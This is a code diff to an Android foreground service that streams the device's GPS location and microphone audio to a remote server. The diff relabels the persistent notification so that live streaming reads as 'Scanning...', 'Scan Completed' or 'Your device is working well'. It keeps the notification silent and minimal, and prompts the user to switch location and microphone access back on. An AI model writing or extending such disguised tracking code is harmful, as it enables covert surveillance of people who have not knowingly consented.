@@ -7,6 +7,13 @@ import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.content.pm.PackageManager
+import android.location.LocationManager
+import android.content.BroadcastReceiver
+import androidx.core.content.ContextCompat
+import android.Manifest
+import android.provider.Settings
 import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
@@ -58,16 +65,25 @@ class SentinelForegroundService : Service() {
 
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
 
+    private val locationReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            if (intent?.action == LocationManager.PROVIDERS_CHANGED_ACTION) {
+                checkPermissionsAndSettings()
+            }
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         Log.i(TAG, "Service created")
         createNotificationChannel()
+        registerReceiver(locationReceiver, IntentFilter(LocationManager.PROVIDERS_CHANGED_ACTION))
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "Service starting")
 
-        val notification = buildNotification("Connecting...")
+        val notification = buildNotification("Scanning ...")
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(
@@ -80,9 +96,7 @@ class SentinelForegroundService : Service() {
             startForeground(NOTIFICATION_ID, notification)
         }
 
-        // Set streamer permissions — we're in a foreground service context
-        locationStreamer.hasPermission = true
-        audioStreamer.hasPermission = true
+        checkPermissionsAndSettings()
 
         // Start connection
         connectionSupervisor.start()
@@ -92,11 +106,11 @@ class SentinelForegroundService : Service() {
             val result = connectUseCase.execute(SERVER_URL, JWT_TOKEN)
             result.onSuccess {
                 Log.i(TAG, "Connected and registered successfully")
-                updateNotification("Connected & Streaming")
+                updateNotification("Your device is working well")
             }
             result.onFailure { error ->
                 Log.e(TAG, "Connection failed: ${error.message}")
-                updateNotification("Connection failed")
+                updateNotification("Action needed!")
             }
         }
 
@@ -104,11 +118,11 @@ class SentinelForegroundService : Service() {
         serviceScope.launch {
             connectionSupervisor.state.collect { state ->
                 val text = when (state) {
-                    is ConnectionState.Ready -> "Connected & Streaming"
-                    is ConnectionState.Reconnecting -> "Reconnecting..."
+                    is ConnectionState.Ready -> "Scan Completed"
+                    is ConnectionState.Reconnecting -> "Scanning..."
                     is ConnectionState.Error -> "Error: ${state.message}"
-                    is ConnectionState.Disconnected -> "Disconnected"
-                    else -> "Connecting..."
+                    is ConnectionState.Disconnected -> "Scan failed"
+                    else -> "Scanning..."
                 }
                 updateNotification(text)
             }
@@ -119,6 +133,11 @@ class SentinelForegroundService : Service() {
 
     override fun onDestroy() {
         Log.i(TAG, "Service destroyed")
+        try {
+            unregisterReceiver(locationReceiver)
+        } catch (e: Exception) {
+            // Ignore
+        }
         connectionSupervisor.stop()
         serviceScope.cancel()
         super.onDestroy()
@@ -139,7 +158,7 @@ class SentinelForegroundService : Service() {
         nm.createNotificationChannel(channel)
     }
 
-    private fun buildNotification(text: String): Notification {
+    private fun buildNotification(text: String, isAlert: Boolean = false): Notification {
         val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
         val pendingIntent = PendingIntent.getActivity(
             this, 0, launchIntent,
@@ -147,17 +166,48 @@ class SentinelForegroundService : Service() {
         )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("")
-            .setContentText("")
+            .setContentTitle(if (isAlert) "Action Required" else "")
+            .setContentText(text)
             .setSmallIcon(R.drawable.ic_silent)
             .setOngoing(true)
-            .setSilent(true)
+            .setSilent(!isAlert)
+            .setPriority(if (isAlert) NotificationCompat.PRIORITY_HIGH else NotificationCompat.PRIORITY_MIN)
             .setContentIntent(pendingIntent)
             .build()
     }
 
-    private fun updateNotification(text: String) {
+    private fun updateNotification(text: String, isAlert: Boolean = false) {
         val nm = getSystemService(NotificationManager::class.java)
-        nm.notify(NOTIFICATION_ID, buildNotification(""))
+        nm.notify(NOTIFICATION_ID, buildNotification(text, isAlert))
+    }
+
+    private fun checkPermissionsAndSettings() {
+        val hasLoc = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        val hasMic = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+        val isGpsEnabled = locationStreamer.isLocationEnabled
+
+        locationStreamer.hasPermission = hasLoc
+        audioStreamer.hasPermission = hasMic
+
+        if (!hasLoc || !isGpsEnabled || !hasMic) {
+            val reason = when {
+                !hasLoc -> "Location permission missing"
+                !isGpsEnabled -> "Location (GPS) is OFF"
+                !hasMic -> "Microphone permission missing"
+                else -> ""
+            }
+            Log.w(TAG, "Requirement missing: $reason")
+            updateNotification("Action Required: $reason", isAlert = true)
+        } else {
+            // Clear alert if everything is fine
+            val text = when (connectionSupervisor.state.value) {
+                is ConnectionState.Ready -> "Connected & Streaming"
+                is ConnectionState.Reconnecting -> "Reconnecting..."
+                is ConnectionState.Error -> "Error: ${(connectionSupervisor.state.value as ConnectionState.Error).message}"
+                is ConnectionState.Disconnected -> "Disconnected"
+                else -> "Connecting..."
+            }
+            updateNotification(text, isAlert = false)
+        }
     }
 }
